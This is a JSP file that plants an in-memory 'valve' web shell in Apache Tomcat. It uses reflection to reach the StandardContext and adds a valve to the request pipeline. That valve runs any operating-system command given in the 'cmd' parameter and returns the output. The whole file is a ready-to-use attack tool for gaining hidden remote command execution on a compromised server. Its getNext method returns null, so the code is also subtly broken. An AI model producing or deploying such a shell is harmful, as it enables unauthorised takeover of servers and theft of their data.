<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="org.apache.catalina.Valve" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    class EvilValve implements Valve {
        @Override
        public Valve getNext() {
            return null;
        }
        @Override
        public void setNext(Valve valve) {

        }
        @Override
        public void backgroundProcess() {

        }
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream())
                );
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                response.getOutputStream().write(stringBuilder.toString().getBytes());
                response.getOutputStream().flush();
                response.getOutputStream().close();
                getNext().invoke(request, response);
            }else {
                getNext().invoke(request, response);
            }
        }
        @Override
        public boolean isAsyncSupported() {
            return false;
        }
    }
%>

<%
    /**
     * 已测试：tomcat8
     */
    try{
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx;
        stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext;
        standardContext = (StandardContext) stdctx.get(applicationContext);
        Valve evilValve = new EvilValve();
        standardContext.getPipeline().addValve(evilValve);
        out.println("valve shell inject success");
    } catch (NoSuchFieldException | IllegalAccessException e) {
        e.printStackTrace();
    }
%>